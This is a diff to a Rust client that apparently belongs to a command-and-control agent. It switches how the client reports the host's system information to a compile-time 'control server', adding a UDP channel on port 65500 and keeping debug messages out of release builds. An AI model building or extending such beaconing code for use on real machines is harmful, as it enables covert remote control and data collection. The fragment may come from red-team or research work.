@@ -14,6 +14,7 @@ use http::{
     get_request,
     post_request,
 };
+use crate::communication::udp::send_identity_udp;
 
 // Note that URL is set by environment variable during compilation
 const URL: &'static str = env!("CONTROL_SERVER_URL");
@@ -23,7 +24,8 @@ const COMMAND_ENDPOINT: &'static str = "/control/client/task";
 const RESULT_ENDPOINT: &'static str = "/client/task/result";
 
 
-
+const REMOTE_HOST: &'static str = env!("CONTROL_SERVER");
+const REMOTE_PORT: &'static str = "65500";
 
 /// Sends the clients identifying characteristics to the control server.
 ///
@@ -34,15 +36,29 @@ const RESULT_ENDPOINT: &'static str = "/client/task/result";
 /// This function fails if there are issues sending the request, or if 200 is not returned from
 /// the server
 pub async fn send_identity(id: SystemInformation) -> Result<String, anyhow::Error> {
+    /*
     let res = post_request(serde_json::to_string(&id).unwrap(),
                            URL,
                            INIT_ENDPOINT,
                            &String::from("")).await?;
-
+*/
+    let res = match send_identity_udp(REMOTE_HOST.to_string(),
+                                      REMOTE_PORT.to_string(),
+                                      format!("{}{}", URL, INIT_ENDPOINT),
+                                      String::new(),
+                                      serde_json::to_string(&id).unwrap()) {
+        Ok(val) => val,
+        Err(e) => {
+            #[cfg(debug_assertions)]
+            println!("Failed to send identity: {}", e);
+            String::new()
+        }
+    };
     let response: Auth = serde_json::from_str(&*(res))
         .unwrap_or_else(|_error| {
             Auth { authorization: String::from("") }
         });
+
     Ok(response.authorization)
 }
 
